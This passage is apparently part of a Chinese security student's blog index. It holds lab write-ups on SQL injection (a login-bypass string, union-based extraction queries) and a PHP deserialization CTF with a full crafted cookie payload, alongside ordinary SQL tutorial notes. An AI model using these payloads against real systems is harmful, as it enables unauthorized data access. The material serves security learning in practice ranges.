注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 post传参 post注入和get注入并没有多大的区别,只是传参方式变了而已.get是在url里面传参,post是在各种框框之中,比如说登录框,查询框,各种和数据库有交互的框之中 万能密码 因为用户登录的时候一般要输入用户名和密码,所以想象一下数据库查询语句可能是select * from table where user=&#39;$user&#39; and pwd=&#39;$pwd&#39;这里就可以通过闭合单引号来实现万能密码.select * from table where user=&#39;&#39;1 or 1=1#&#39; and pwd=&#39;$pwd&#39;这样or 1=1恒成立,用户名不填也没事,而密码已经被注释掉了,填什么也无所谓.这样就变成了一个恒为真的万能密码,就可以再配合order by,limit,select等开始报库 靶场实战 zkaq–writeup:https://wxnsoul.github.io/2020/04/04/POST%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-POST注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"Get注入--zkaq靶场","text":"一段时间没做确实生疏了0.0代码都忘了一部分,最主要的还是会忘记Mysql数据库自带的那几个库名.table_schema,information_schema.tables,information_schema.columns靶场链接:https://hack.zkaq.cn/一上来就可以看出这是get注入,因为在url里面传参id 在后面尝试加入and 1=1 ,or 1=1,and1=2之类的判断select *from user where id=1 and 1=1页面正常返回,在尝试输入select *from user where id=1 and 1=2页面返回错误,这说明就是把用户输入的数据当作代码执行了 再使用order by测试出字段数select *from user where id=1 order by 4)一直到order by 4的时候页面返回错误,所以可以判断出只有三个字段 使用连接查询来判断注入点select *from user where id=1 union select 1,2,3可以得知2,3是注入点 在注入点处替换数据库查询语句,首先爆数据库select *from user where id=1 union select 1,2,database()可以看到数据库名是error 接着爆表select *from user where id=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;error&#39; limit 1,1可以得出表名是error_flag 接着爆字段select *from user where id=1 union select 1,2,column_name from information_schema.columns where table_name=&#39;error_flag&#39; limit 2,1 这个表中一共三个字段,如果不使用limit的话会直接返回最后一个字段.我们可以得出字段是flag 最后爆值select *from user where id=1 union select 1,2,group_concat(flag) from error_flag成功得出flag 总的来说流程就是这样的,剩下两个get注入的靶场也都只要注意下闭合就行,很简单个人打算学完zkaq之后去刷ctf题目,那边的难一点适合提升,有各种过滤,需要去绕过","path":"2020/04/03/Get注入-zkaq靶场/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--原理分析以及Get注入","text":"SQL注入原理分析 注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 显错注入的基本流程 代码流程 使用 and 1=1,or 1=1,sleep等来判断是否可以注入(会不会被当作代码执行,注意闭合) 使用order by判断出字段数 使用select 1,2..开始判断注入点 改变id值使其出错来使得页面有回显或者使用limit 来控制输出条数 select 1,table_name from information_schema.tables where table_schema=database() select 1,column_name from information_schema.columns where table_name = select 1,column_name from table_name limit 0,1 具体实操直接看靶场的write uphttps://wxnsoul.github.io/2020/04/03/Get%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/03/SQL注入-原理分析以及Get注入/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--web安全前端基础","text":"学习编程的意义 黑盒测试:无源码白盒测试:有源码(就比如后面的代码审计模块)记住一句话，我们是学习渗透测试的!不是学习开发的!开发的核心在于写代码渗透测试人员的核心在于看代码[写工具另类]如何学习编程? 1.-定要自己动手2.基础语法逻辑很重要3.不知道如何学习的可以看看菜鸟教程或者W3C这串红色的话真的是克服了我对他的恐惧,以前总是觉得很困难! 前端 HTML基础 )浏览器部分的源码我们可以随意修改,但是刷新时候又变回去了.因为服务器端的数据并没有被修改,就比如:因为浏览器是在我们本地的,所以可以直接修改数据,但是修改不到服务器端的数据 JS学习 Jscript是大大的拓展了前端页面和用户交互的功能，Ｊｓ其实核心就是操作你得浏览器去做其他规定的事情，很明显JS可以操纵你得浏览器，这是一个很危险的事情，所以说如果你执行了恶意的Ｊｓ代码会影响你电脑的安全性可以在设置中禁用ｊｓ有时就会出现漏洞","path":"2020/04/03/zkaq-web安全前端基础/","date":"04-03","excerpt":"","tags":[{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]},{"title":"web服务通信原理","text":"zkaq的课程基本学的差不多了,到这里的时候基本还剩一丢丢部分还没有学习了,waf放入绕过和实战讲解.我不想过于着急去看实战了,毕竟基础不好的话看了等于浪费,于是打算把前面的知识点都复习回顾一边 基本常识 ip就是指地址,ip又分为公网地址和内网地址.比如说自己虚拟机里的ipv4地址,本机的ipv4地址,就是内网地址.比如你家的门牌号那就是个公网地址，X省X市X街道X号，别人看到这个地址就能找到你家内网地址是什么妮，假设你住的是-一个大楼，比如住401房间，那么只有同一个大楼里面的人才能够通过401这个地址找到你的房间吧。其他人根本不知道是哪里的401房间对吧 所以说公网比内网要更加精确,他能直接找到你在哪.内网只是在知道你在哪后继续划分你在这里的具体哪里.前面说到了路由器是划分内网地址的,所以自己本机里的IP地址千万不要以为是公网地址.那么如何查看自己的公网地址呢?直接百度搜索ip就可以了. C段 前面三个值相同,最后一个事0-255就是c段如:114.114.114.0和114.114.114.255 域名 实际上是为了方便记忆所发明的一个字符串标识DNS:讲域名转化为ip的一个协议(对应内容找相应的服务器)因为让你直接去记一个公网ip,去访问,肯定是比较费脑子的.但是你使用域名代替之后,比如www.baidu.com就会很方便的记住了域名等级:有几个点间隔就是几级,联系是二级域名是依附在顶级域名之上的,顶级域名可以扶持N个二级域名 DNS 上面访问域名为什么会访问到对应的ip呢?这就是因为DNS解析协议了.它就是把域名转化成对应的ip地址,然后去访问相应的服务器. 端口 端口是什么呀?端口就像电脑的接口，像USB接口，比如你需要用键盘时候，你要把键盘插入接口，端口就是类似的东西，端口主要是网络接口，比如你去访问别人网站，一般来说你实际上是去他的80端口进行通信。我们有多少个端口妮?有范围是从0到65535 (2^16-1)0端口是预留端口。一般不会用到 cookie(不安全) 是服务器给你的代表你身份的一串字符串.为了提升用户体验的,但是越便捷的东西越不安全 web容器 是可以向发出请求的浏览器提供文档的程序(其实我们访问IP时访问到的就是web容器)(是一个被动的程序)常见的web容器:IIS(WINDOWS)Apache(全平台)Nginx(全平台)Tomcat 动态语言 定义:是对服务器行为的编程,这被称为服务器脚本或服务器端脚本作用: 动态地向web页面编辑、改变或添加任何的内容 对由HTML表单提交的用户请求或数据进行响应 访问数据或数据库，并向浏览器返回结果 为不同的用户定制页面 提高网页安全性，使您的网页代码不会通过浏览器被查看到常见的服务器脚本: 搭建一个网站 安装web容器(Apache) 安装静态语言(PHP) 安装数据库(Mysql)嫌弃麻烦,所以有人出了集成,如宝塔,phpstudy(php5.4.45+Apache用的比较多) 其中index.php是默认的根目录 动手搭建实践碰到的问题 重新回顾视频得时候发现原来可以通过主机来访问虚拟机得IP地址,但是ping虚拟机却一直不能成功,原因是没有关闭虚拟机里的两个防火墙 勾取允许目录列表之后却不能访问到目录,原因是没有把l.php给删掉.(l.php就是探针,更目录下的默认访问页面,就像打开phpmyadmin一样index是默认页面)在conf里面得vhost可以改配置文件 增加新的站点时尝试过多次后发现,根目录不可以用于网页地址,如单单的一个E:,或者C: 后期发现sql服务会占用8080端口,所以自己不在本机装phpstudy了,关闭服务都嫌弃麻烦","path":"2020/04/03/web服务通信原理/","date":"04-03","excerpt":"","tags":[{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"}]},{"title":"SQL语句--空值及其处理","text":"什么是空值 空值从技术上来说就是“未知的值”。但空值并不包括零、一个或者多个空格组成的字符串、以及零长度的字符串. 检测空值 因为空值是代表未知的值，所以并不是所有的空值都相等。例如student表中有两个学生的出生日期未知，但无法证明这两个学生的年龄相等。这样就不能用“=”运算符来检测空值。所以T-SQL引入了一个特殊的操作符IS来检侧特殊值之间的等价性。检测空值的使用语法如下： WHERE 表达式 IS NULL检测非空值的使用语法如下： WHERE 表达式 IS NOT NULL 处理空值 为了将空值转换为一个有效的值，以便于对数据理解，或者防止表达式出错。SQL Server专门提供了ISNULL函数将空值转换为有效的值，其使用语法格式如下： ISNULL(check_expr,repl_value）其中，check_expr是指被检查是否为NULL的表达式，可以是任何数据类型。repl_value是在check_expr为NULL时用其值替换NULL值，需与check_expr具有相同的类型。就像replace函数","path":"2020/04/02/SQL语句-空值及其处理/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--子查询","text":"子查询简单子查询 当一个查询是另一个查询的条件时，称之为子查询。子查询可以使用几个简单命令构造功能强大的复合命令。子查询可以嵌套。 嵌套查询的过程是：首先执行内部查询，它查询出来的数据并不被显示出来，而是传递给外层语句（亦称主查询），并作为外层语句的查询条件来使用。 相关子查询 在前面的例子中，子查询都仅执行一次，并将得到的值代入外部查询的WHERE子句中进行计算，这样的子查询称之为非相关子查询，非相关子查询是独立于外部查询的子查询。 而有些查询中，子查询依靠外部查询获得值，这意味着子查询是重复执行的，为外部查询可能选择的每一行均执行一次，这样的子查询称之为相关子查询（也称为重复子查询）。 就是说相关子查询不会像非相关得那样只查询一次,而是分组后每一行都会区查询一遍,有点像group by使每一行有一个聚合值,求每一…都满足….得时候就可以使用 复杂子查询 如果一个子查询返回的不止一个值，将其称之为复杂子查询。主要有如下3种常用的复杂子查询： 使用IN或NOT IN引入子查询。其基本格式为：WHERE 表达式 [NOT] IN (子查询)。 使用ANY或ALL。其基本格式为：WHERE 表达式 比较运算符 [ANY | 3. ALL] (子查询)。其中，ANY表示任意一个，ALL表示所有的。使用EXISTS引入存在测试。其基本格式为：WHERE [NOT] EXISTS (子查询)。 (1)in 和 not in 通过IN（或NOT IN）引入的子查询返回结果是一个集合，该集合可以为空或者含有多个值。子查询返回结果之后，外部查询将利用这些结果。就是说在子查询得到的结果集中查找或者不在子查询得到的结果集中进行查找 (2)any 和 all ANY或ALL通常与关系运算符连用，这时的子查询返回结果是一个集合，如&gt; ANY(子查询)表示大于该集合中任意一个值时为真，而&gt; ALL(子查询)表示大于该集合中所有值时为真。应该还是很好理解的 (3)exists EXISTS后紧跟一个SQL子查询，从而构成一个条件，当该子查询至少存在一个返回值时，这个条件为真，否则为假。NOT EXISTS与之相反，当该子查询至少存在一个返回值时，这个条件为假，否则为真。也很好理解 多层嵌套 子查询可以嵌套在外部SELECT、INSERT、UPDATE或DELETE语句的WHERE或HAVING子句内，或者其他子查询中。尽管根据可用内存和查询中其他表达式的复杂程度不同，嵌套限制也有所不同，但一般均可以嵌套到32层。这个是两层嵌套,查找考了最高分学生的姓名班级要先查找最高分,然后找到他的学号,再根据学号找到姓名班级 查询结果的并 T-SQL命令还提供了UNION子句，它可以将多个SELECT命令连接起来生成单个SQL无法做到的结果集合。这就是sql注入里面常用的union查询,他要求结果集的列数相同,这样才能够吧所有的结果合并到一起 数据来源是一个查询的结果 在查询语句中，FROM指定数据来源，它可以是一个或多个表。实际上，由FROM指定的数据来源也可以是一个SELECT查询的结果。用到了数据来源是一个嵌套结果,自连接,排序,聚合","path":"2020/04/02/SQL语句-子查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--连接查询","text":"1.简单连接查询 在一个查询中，当需要对两个或多个表连接时，可以指定连接列，在WHERE子句中给出连接条件，在FROM子句中指定要连接的表，其格式如下： SELECT 列名1，列名2，… FROM 表1，表2，… WHERE 连接条件 对于连接的多个表通常存在公共列，为了区别是哪个表中的列，在连接条件中通过表名前缀指定连接列。例如，“teacher.编号”表示teacher表的编号列，“student.学号”表示student表的学号列，由此来区别连接列所在的表。 (1)等值连接 所谓等值连接，是指表之间通过“等于”关系连接起来，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。 (2)非等值连接 所谓非等值连接，是指表之间的连接关系不是“等于”，而是其他关系。通过指定的非等值关系将两个表连接起来的，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。就比如这个between and (3)自连接 在数据查询中有时需要将同一个表进行连接，这种连接称之为自连接，进行自连接就如同两个分开的表一样，可以把一个表的某行与同一表中的另一行连接起来。 这个自连接就是自己和自己连接比较,所以需要用到x,y来区分 复杂连接查询 在SELECT的FROM子句中指定连接条件，有助于将这些连接条件与WHERE子句中可能指定的其他搜索条件分开，其连接语法如下： FROM 第一个表名 连接类型 第二个表名 [ON (连接条件)]根据连接条件分为内连接、外连接和交叉连接等复杂连接查询类型举例: 其实就是取交集得意思 (2)外连接 外连接会返回FROM子句中提到的至少一个表或视图的所有行，只要这些行符合任何WHERE或HAVING搜索条件。外连接检索通过左外连接引用的左表的所有行，以及通过右外连接引用的右表的所有行,而全外连接中两个表的所有行都将返回。 LEFT OUTER JOIN或LEFT JOIN（左外连接） RIGHT OUTER JOIN或RIGHT JOIN（右外连接） FULL OUTER JOIN或FULL JOIN（全外连接） (3)左外连接 左外连接简称为左连接，其结果包括第一个表（“左”表，出现在JOIN子句的最左边）中的所有行，不包括右表中的不匹配行。举例:说白了就是1-5是内连接得结果,6是把左表不满足条件得也加进来(会显示null) (4)右外连接 右外连接简称为右连接，其结果中包括第二个表（“右”表，出现在JOIN子句的最右边）中的所有行，不包括左表中的不匹配行。 举例: (5)全外连接若要通过在连接结果中包括不匹配的行保留不匹配信息，可以使用全外连接。SQL Server提供全外连接运算符FULL OUTER JOIN，不管另一个表是否有匹配的值，此运算符都包括两个表中的所有行。 举例:这就是左右外连接得结合其实 (6)交叉连接在这类连接的结果集内，两个表中每两个可能成对的行占一行。交叉连接不使用WHERE子句。 在数学上，就是表的笛卡尔积。第一个表的行数乘以第二个表的行数等于笛卡尔积结果集的大小。笛卡儿积","path":"2020/04/02/SQL语句-连接查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--聚合函数","text":"功能 聚合函数实现数据统计等功能，用于对一组值进行计算并返回一个单一的值，除COUNT函数外，聚合函数忽略空值。聚合函数常与SELECT语句的GROUP BY子句一起使用。 #常用的聚合函数# 聚合参数得一般格式 其中，ALL表示对所有值进行聚合函数运算，它是默认值；DISTINCT指定每个唯一值都被考虑；expr指定进行聚合函数运算的表达式。 举例 作用范围 通常一个聚合函数的范围是满足WHERE子句指定的条件的所有记录。在加上GROUP BY子句后，SQL命令把查询结果按指定列分成集合组。当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。使用HAVING子句可以对这些组进一步加以控制。用这一子句定义这些组所必须满足的条件，以便将其包含在结果中。当WHERE子句、GROUP BY子句和HAVING子句同时出现在一个查询中时，SQL的执行顺序如下： 执行WHERE子句，从表中选取行。 由GROUP BY对选取的行进行分组。 执行聚合函数。 执行HAVING子句选取满足条件的分组。 聚合函数:AS 说一说这个as得作用,第一列得值是课程号,因为select 课程号,但是第二列是一个聚合函数,所以需要as来做一个别名再来说聚合函数max得作用,就像上面说的,聚合函数得范围由所有得变为每组得所有记录,也就是说它先去找3-105这一组里面得最高分,再去找3-245,以此类推,从而达到了寻找每一门课得最高分要求 group by子句 GROUP BY子句用来为结果集中的每一行产生聚合值。如果聚合函数没有使用GROUP BY子句，则只为SELECT语句报告一个聚合值。指定GROUP BY时，选择列表中任一非聚合表达式内的所有列都应包含在GROUP BY列表中，或者GROUP BY表达式必须与选择列表表达式完全匹配。 简单地说就是不使用group by就对整个结果集做聚合函数运算,用了就按组划分,做聚合函数运算 HAVING子句 在SELECT查询中，在给定分组GROUP BY子句后，可以通过HAVING子句中使用聚合函数来进行分组条件判断。就是说使用了group by需要用到聚合函数作为筛选条件,就得用having.并且,使用聚合函数返回得值应该是唯一得!!! select cnum,score as ‘及格以上’ from score group by cnum having min(score)&gt;=60我在自己得数据库中这样写尝试找出所有最低分大于60得学生得学号和所有分数.这样是错的!因为返回得学号都是单一得,但是所有大于60得科目肯定不止一课!不是唯一值!!只能这么改select cnum from score group by cnum having min(score)&gt;=60找出最低分&gt;60得学生得学号,肯定是单一的 总结要点当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。并且,使用聚合函数返回得值应该是唯一得!!!对一组值进行计算并返回一个单一的值!!!","path":"2020/04/02/SQL语句-聚合函数/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"关于markdown2","text":"初步理解markdown就是一个编译器,在一次查阅时有了一个清晰得认识 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过类似HTML的标记语法，它可以使普通文本内容具有一定的格式。但是它本身是不支持修改字体、字号与颜色等功能的！ CSDN-markdown编辑器是其衍生版本，扩展了Markdown的功能（如表格、脚注、内嵌HTML等等）！ 所以说,其实markdown2是方便用于直接编写html页面得一个编辑器,是可以接受heml标签得,想要调整字体得颜色大小直接使用html标签即可 &lt;font color=&quot;&quot;&gt;&lt;/font&gt;","path":"2020/04/02/关于markdown2/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"使用七牛云来上传图片","text":"mpic使用学习:https://www.jianshu.com/p/7c537ccf18f9 一开始使用在github上建仓库然后使用git上传在获取链接,这样子上传图片真的是麻烦的不得了,在了解了mpic之后,,,,啊啊啊啊,真的方便,使用图片跟word里面差不错了,甚至还可以直接上传QQ截图和复制的图片自动上传…真是6666 只不过你需要打开这些功能 可惜七牛云上面的开辟的空间只有30天可用时间,得自己去注册一个才可以无限用下去.我自己去阿里云注册了个域名 选一个自己喜欢后缀,合适得价位买一个就好. 但是买完之后不去备案得花是不能够使用得,,还得先去备案.备案推荐这篇文章,写的很详细:https://blog.51cto.com/13373096/2339036中间自己碰到了几个坑总结一下:备案前提 网站备案前提准备：1、备案域名，准备需要备案的域名（域名可以不在阿里云），域名需要实名认证（个人域名就个人认证，企业域名就企业认证），域名备案主体要与实名认证信息相符合。 2、备案服务号，在阿里云备案需要备案服务号，购买阿里云大陆地域的ECS云服务器、虚拟主机、轻量应用服务器等就可以申请备案号，如何申请备案号参考：阿里云备案服务号申请方法及说明 3、备案材料，个人备案需要×××图片、《网站备案真实性核验单》（核验单在备案过程中即可下载，按照流程操作即可），由于当地管局备案规则不同，有可能还需要域名证书，域名证书需要去域名注册商网站上获取。企业备案需要营业执照、备案负责人和网站负责人×××件照片、《网站备案真实性核验单》，另外，由于当地管局备案规则不同，有可能需要其他证明材料，例如域名证书、法定代表人委托授权书等，按照要求准备材料即可。 备案域名就有坑,你实名注册之后,其实是还需要等待三天才是真正得注册完成工信部那边还没跟新你的消息,所以后面我备案死活进行不下去 备案服务号也是,需要你有服务器才可以去申请,但是我只买了个域名(其实如果是学生得花可以去买个学生机,不贵,9.5一个月)但是当时自己没想买,就百度到了一个公众号花9.9买了一个备案服务号然后选择使用备案服务号可以","path":"2020/04/02/使用七牛云来上传图片/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"zkaq--序列化与反序列化","text":"定义:序列化是将对象的状态信息转换为可以存储或传输的形式的过程 代码为： serialize ( mixed $value )反序列化则相反，代码为：unserialize ( string $str )如果只是这样，那么应该没有什么可以利用的漏洞。然而，serialize ( mixed $value )与unserialize ( string $str )这两个函数在使用时，会自动使用一些魔法函数，以及，如果在定义的类内存在魔法函数，也会自动调用 也就是说,序列化与反序列化必须要配合一些魔法函数才能发挥作用 反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。 函数介绍 变量 FILE这是用于返回当前访问得文件得目录的 show_source()函数###用于显示页面源代码的,括号中填路径,配合FILE使用就是显示当前页面的源代码 魔法函数__toString###__toString() 是魔术方法的一种，具体用途是当一个对象被当作字符串对待的时候，会触发这个魔术方法以下说明摘自PHP官方手册public string __toString ( void )__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。Warning不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 *输出字符串时是不会触发的,把类当字符串输出才会触发* ###其余常用的魔法函数### writeup题解 这是题目的源码,很明显是代码审计第一行可以得知flag在./flag.php中访问一下什么也没有,检查源代码也没有.这说明服务器端的php代码并没有输出值.需要用到show_resource才能看到flag 思路Highlight_file(,true)就是确认开启代码高亮引用了一个魔术方法toString,检测到把类当初字符串输出后就会会把readme.txt和$this-&gt;source拼接在一起输出.源码中赋值的是FILE__所以这个页面会输出源码,如果我们把source的赋值变成flag.php把岂不是也能输出flag了?而全文就只有一个输出类的地方似乎就是检测get传参的那边.他会把当前文件的路径名传给resource变量然后输出.但其实还有一个输出的点,那就是就相当于echo $tode 这里很明显是把数组todos遍历输出在cookie传参的时候会有用到todos,会把m反序列化之后传给todos,但是这时候的todos并不是数组,所以只要强行给m值加上一个中括号,这样todos就变成了一个数组变量S是已经无法修改了只能是赋值FILE,所以得在另外一个输出点下手.Cookie判断里,substr($a,32)和substr($a,0,32)前者是从$a第32位之后开始取值,后者是取值前32. &nbsp如果h=md5(m)就会给todos赋值,c是我们可以控制的,这说明c应该是由md5(m).m构成,这样就变成了md5(m)==md5(m),而m会被反序列化,说明c的后32位应该先序列化.只要把我们想要的flag.php序列化,然后给m,todos输出就会得到源码.但是todos必须是数组才会输出,所以得给readme对象再加一个[],然后再去序列化 这里的a指数组,i指第几个元素,0就是第零个这里的序列化是非常的关键的!!!必须使用readme类,source变量!!!这样反序列化之后就相当于给这个类的source复制成自己想要的了! 的时候就能输出源码了因为只有readme类里面才有这个__toString函数!这个函数也只输出source变量的源码!我们把序列化之后的字符串md5加密,得到e2d4f7dcc43ee1db7f69e76303d0105c把他们拼接在一起得到e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}},todos就能执行foreach,在cookie中被反序列化后就是一个有着信息的数组类,在foreach中输出.就会触发toString.这边有个小提示,cookie传参和get传参一样,是会先进行url编码的,所以得先编码再传参cookie,用burp抓包修改. e2d4f7dcc43ee1db7f69e76303d0105ca%3a1%3a%7bi%3a0%3bO%3a6%3a%22readme%22%3a1%3a%7bs%3a6%3a%22source%22%3bs%3a8%3a%22flag.php%22%3b%7d%7d 紧接着抓包修改页面,把cookie值改成上面一串,成功得到flag 总结cookie传过去之后的流程: if(isset($COOKIE[‘todos’]))接收到cookie里的todos传参,为真进入if判断 然后把todos值赋给了$c,$h接收了$c的前32位,$m接收了$c的从第33位到结束所有的 把$m md5加密后与$h比较发现是一样的,就将$m反序列化,此时得到的就是[$readme],它是一个数组,数组中是一个readme对象,source的值是flag.php 因为没有get,post传参所以直接往下执行,直接遍历输出todos,输出readme类之后就会触发__toString魔术方法,自动输出该方法里的source页面的代码,和readme.txt拼接在一起后输出 得到了flag","path":"2020/04/01/zkaq-序列化与反序列化/","date":"04-01","excerpt":"","tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}],"categories":[],"tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"本地包含于远程包含","slug":"本地包含于远程包含","permalink":"http://wxnsoul.github.io/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"http://wxnsoul.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"XXE","slug":"XXE","permalink":"http://wxnsoul.github.io/tags/XXE/"},{"name":"支付漏洞","slug":"支付漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"},{"name":"servlet","slug":"servlet","permalink":"http://wxnsoul.github.io/tags/servlet/"},{"name":"HTTP","slug":"HTTP","permalink":"http://wxnsoul.github.io/tags/HTTP/"},{"name":"Request","slug":"Request","permalink":"http://wxnsoul.github.io/tags/Request/"},{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"},{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"},{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"},{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"},{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"},{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"},{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"},{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"},{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"},{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"},{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%